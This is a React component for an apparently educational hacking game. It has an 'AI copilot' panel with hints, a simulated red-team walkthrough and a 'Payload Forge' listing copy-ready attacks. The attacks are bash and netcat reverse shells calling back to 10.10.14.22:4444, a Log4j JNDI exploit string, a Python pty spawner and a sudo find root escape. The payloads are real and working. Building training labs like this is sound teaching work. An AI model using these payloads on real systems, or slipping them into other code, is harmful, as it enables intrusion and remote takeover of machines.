import React, { useState } from 'react';
import { Bot, Sparkles, Copy, Check, Lightbulb, Cpu } from 'lucide-react';
import { useGameStore } from '../store/gameStore';
import { soundManager } from '../audio/soundManager';

interface Payload {
  title: string;
  category: 'REVERSE_SHELL' | 'EXPLOIT_STRING' | 'PRIVESC' | 'SHELL_STABILIZE';
  code: string;
  description: string;
}

const OFFENSIVE_PAYLOADS: Payload[] = [
  {
    title: 'Bash TCP Interactive Reverse Shell',
    category: 'REVERSE_SHELL',
    code: 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1',
    description: 'Standard Linux /dev/tcp network redirect. Bypasses restricted shell containers.',
  },
  {
    title: 'Netcat Named Pipe Reverse Shell',
    category: 'REVERSE_SHELL',
    code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 4444 >/tmp/f',
    description: 'Traditional mkfifo FIFO pipe for netcat binaries compiled without -e support.',
  },
  {
    title: 'Log4j JNDI Remote Bytecode String',
    category: 'EXPLOIT_STRING',
    code: '${jndi:ldap://10.10.14.22:1389/Exploit}',
    description: 'Triggers CVE-2021-44228 JNDI lookup via LDAP referral server to execute in-memory Java bytecode.',
  },
  {
    title: 'Python3 TTY Shell Spawner & PTY Stablizer',
    category: 'SHELL_STABILIZE',
    code: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    description: 'Spawns a full pseudo-terminal from a dumb netcat shell to enable clear, nano, and su prompts.',
  },
  {
    title: 'GTFOBins Sudo Find Root Escape',
    category: 'PRIVESC',
    code: 'sudo /usr/bin/find . -exec /bin/sh \\; -quit',
    description: 'Executes root shell when find has NOPASSWD sudo privileges in /etc/sudoers.',
  },
];

export const GhostOpsAi: React.FC = () => {
  const { activeMachineId, machines } = useGameStore();
  const activeTarget = machines.find((m) => m.id === activeMachineId) || machines[0];

  const [aiMode, setAiMode] = useState<'MENTOR' | 'PAYLOADS' | 'AUTOPILOT'>('MENTOR');
  const [copiedIndex, setCopiedIndex] = useState<number | null>(null);

  const handleCopy = (code: string, idx: number) => {
    soundManager.playKey();
    navigator.clipboard.writeText(code);
    setCopiedIndex(idx);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  return (
    <div className="flex h-full bg-[#070a0f] border border-slate-800 rounded-lg overflow-hidden font-mono shadow-2xl">
      {/* Left Control Column */}
      <div className="w-64 border-r border-slate-800 bg-[#0a0f17] p-4 flex flex-col justify-between text-xs">
        <div>
          <div className="flex items-center space-x-2 text-cyan-400 font-bold mb-4 pb-2 border-b border-slate-800">
            <Bot className="w-5 h-5 text-cyan-400 animate-pulse" />
            <span className="tracking-wider uppercase">GHOSTOPS AI COPILOT</span>
          </div>

          <div className="space-y-1.5">
            <button
              onClick={() => {
                soundManager.playKey();
                setAiMode('MENTOR');
              }}
              className={`w-full text-left px-3 py-2 rounded flex items-center space-x-2 transition ${
                aiMode === 'MENTOR'
                  ? 'bg-cyan-950/80 border border-cyan-500/50 text-cyan-300 font-bold'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Lightbulb className="w-4 h-4 text-amber-400" />
              <span>Socratic Mentor</span>
            </button>

            <button
              onClick={() => {
                soundManager.playKey();
                setAiMode('PAYLOADS');
              }}
              className={`w-full text-left px-3 py-2 rounded flex items-center space-x-2 transition ${
                aiMode === 'PAYLOADS'
                  ? 'bg-cyan-950/80 border border-cyan-500/50 text-cyan-300 font-bold'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Sparkles className="w-4 h-4 text-purple-400" />
              <span>Payload Forge</span>
            </button>

            <button
              onClick={() => {
                soundManager.playKey();
                setAiMode('AUTOPILOT');
              }}
              className={`w-full text-left px-3 py-2 rounded flex items-center space-x-2 transition ${
                aiMode === 'AUTOPILOT'
                  ? 'bg-cyan-950/80 border border-cyan-500/50 text-cyan-300 font-bold'
                  : 'text-slate-400 hover:text-white hover:bg-slate-900'
              }`}
            >
              <Cpu className="w-4 h-4 text-emerald-400" />
              <span>Autopilot Red Team</span>
            </button>
          </div>
        </div>

        {/* Current Target Status Tag */}
        <div className="bg-slate-900/80 p-3 rounded border border-slate-800 text-[11px] space-y-1">
          <span className="text-slate-500 block text-[9px]">ACTIVE TARGET FOCUS</span>
          <div className="text-white font-bold">{activeTarget.name}</div>
          <div className="text-emerald-400 font-mono">{activeTarget.ip}</div>
          <div className="text-slate-400 text-[10px]">OS: {activeTarget.os} ({activeTarget.difficulty})</div>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 p-6 overflow-y-auto bg-[radial-gradient(ellipse_at_top,rgba(6,182,212,0.03)_0%,rgba(7,10,15,1)_100%)]">
        {/* MODE 1: SOCRATIC MENTOR */}
        {aiMode === 'MENTOR' && (
          <div className="space-y-4 max-w-4xl">
            <div className="flex items-center space-x-2 pb-2 border-b border-slate-800 text-sm font-bold text-white">
              <Lightbulb className="w-5 h-5 text-amber-400" />
              <span>SOCRATIC HACKER HINTS // {activeTarget.name.toUpperCase()}</span>
            </div>

            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 space-y-3 text-xs leading-relaxed">
              <div className="flex items-center space-x-2 text-cyan-400 font-bold">
                <span className="w-2 h-2 rounded-full bg-cyan-400 inline-block" />
                <span>PHASE 1: RECONNAISSANCE & PORT ENUMERATION</span>
              </div>
              <p className="text-slate-300">
                Start by running a thorough version detection scan on <code className="text-emerald-400">{activeTarget.ip}</code>.
                Examine port 80 and port 8080. Look at the server header returned by Apache. Does the version string match known CVE disclosures?
              </p>
              <div className="p-2 bg-black/40 rounded border border-slate-800/80 font-mono text-slate-400 text-[11px]">
                $ nmap -sV -sC {activeTarget.ip}
              </div>
            </div>

            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 space-y-3 text-xs leading-relaxed">
              <div className="flex items-center space-x-2 text-amber-400 font-bold">
                <span className="w-2 h-2 rounded-full bg-amber-400 inline-block" />
                <span>PHASE 2: FOOTHOLD & INITIAL EXPLOITATION</span>
              </div>
              <p className="text-slate-300">
                Notice that the web application logs incoming HTTP headers using an unpatched logging subsystem.
                Try opening the <strong>HTTP Repeater</strong> tab, selecting the <em>Log4j JNDI exploit preset</em>, and sending it to <code className="text-cyan-400">/api/v1/auth</code> while keeping your Pwnbox Netcat listener running.
              </p>
            </div>

            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-4 space-y-3 text-xs leading-relaxed">
              <div className="flex items-center space-x-2 text-purple-400 font-bold">
                <span className="w-2 h-2 rounded-full bg-purple-400 inline-block" />
                <span>PHASE 3: LOCAL PRIVILEGE ESCALATION TO ROOT</span>
              </div>
              <p className="text-slate-300">
                Once inside the container as <code className="text-emerald-400">www-data</code>, check your sudo privileges with <code className="text-purple-300">sudo -l</code>.
                Look at the allowed binary: <code className="text-red-400">/usr/bin/find</code>. Search GTFOBins for find execution parameters that allow spawning a root shell with EUID=0.
              </p>
            </div>
          </div>
        )}

        {/* MODE 2: PAYLOAD FORGE */}
        {aiMode === 'PAYLOADS' && (
          <div className="space-y-4 max-w-4xl">
            <div className="flex items-center space-x-2 pb-2 border-b border-slate-800 text-sm font-bold text-white">
              <Sparkles className="w-5 h-5 text-purple-400" />
              <span>OFFENSIVE PAYLOAD FORGE // READY-TO-COPY</span>
            </div>

            <div className="space-y-3">
              {OFFENSIVE_PAYLOADS.map((payload, idx) => (
                <div key={idx} className="bg-slate-900/70 border border-slate-800 rounded-lg p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="text-xs font-bold text-white block">{payload.title}</span>
                      <span className="text-[10px] text-slate-500">{payload.description}</span>
                    </div>
                    <button
                      onClick={() => handleCopy(payload.code, idx)}
                      className="flex items-center space-x-1.5 px-3 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono transition"
                    >
                      {copiedIndex === idx ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedIndex === idx ? 'COPIED' : 'COPY'}</span>
                    </button>
                  </div>
                  <pre className="text-xs font-mono text-emerald-400 bg-black/60 p-2.5 rounded border border-slate-800/80 overflow-x-auto select-all">
                    <code>{payload.code}</code>
                  </pre>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* MODE 3: AUTOPILOT RED TEAM */}
        {aiMode === 'AUTOPILOT' && (
          <div className="space-y-4 max-w-4xl">
            <div className="flex items-center space-x-2 pb-2 border-b border-slate-800 text-sm font-bold text-white">
              <Cpu className="w-5 h-5 text-emerald-400" />
              <span>AUTONOMOUS RED TEAM KINEMATICS // WALKTHROUGH</span>
            </div>

            <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-5 space-y-4 text-xs">
              <p className="text-slate-300 leading-relaxed">
                Watch the autonomous offensive execution sequence for <strong className="text-white">{activeTarget.name}</strong>.
                Each phase breaks down the offensive methodology used in real-world professional penetration tests.
              </p>

              <div className="space-y-3">
                <div className="p-3 rounded bg-black/40 border border-slate-800 flex items-start space-x-3">
                  <span className="text-cyan-400 font-bold font-mono">01.</span>
                  <div>
                    <strong className="text-white block">Automated Service Fingerprinting</strong>
                    <p className="text-slate-400 text-[11px] mt-0.5">Scanned ports 22, 80, 8080. Discovered Apache 2.4.49 running Java Spring runtime on target container.</p>
                  </div>
                </div>

                <div className="p-3 rounded bg-black/40 border border-slate-800 flex items-start space-x-3">
                  <span className="text-amber-400 font-bold font-mono">02.</span>
                  <div>
                    <strong className="text-white block">Log4j JNDI Exploit String Injection</strong>
                    <p className="text-slate-400 text-[11px] mt-0.5">Delivered payload via HTTP header. Exploited JNDI lookup to trigger reverse shell callback to 10.10.14.22:4444.</p>
                  </div>
                </div>

                <div className="p-3 rounded bg-black/40 border border-slate-800 flex items-start space-x-3">
                  <span className="text-purple-400 font-bold font-mono">03.</span>
                  <div>
                    <strong className="text-white block">Local Sudo Find Privilege Escalation</strong>
                    <p className="text-slate-400 text-[11px] mt-0.5">Exploited NOPASSWD find configuration. Escalated from www-data to root (UID 0), fully rooting the target system.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
